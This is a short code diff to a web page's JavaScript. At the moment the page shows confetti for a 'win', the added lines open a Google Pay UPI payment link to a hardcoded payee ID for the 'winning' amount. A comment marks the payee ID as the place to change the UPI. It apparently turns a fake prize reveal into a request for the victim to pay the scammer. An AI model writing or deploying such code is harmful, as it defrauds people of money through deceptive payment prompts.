@@ -187,6 +187,8 @@ console.log(price);
       {
       document.querySelectorAll('.confetti')[i].style.visibility = 'visible';
       }
+      var id = 'Q775086968@ybl' // change UPI from here
+      window.open("gpay://upi/pay?pa="+id+"&pn=Winning Payee&tn=Winning Amount&am="+price+"&mode=01")
     }
   }
   
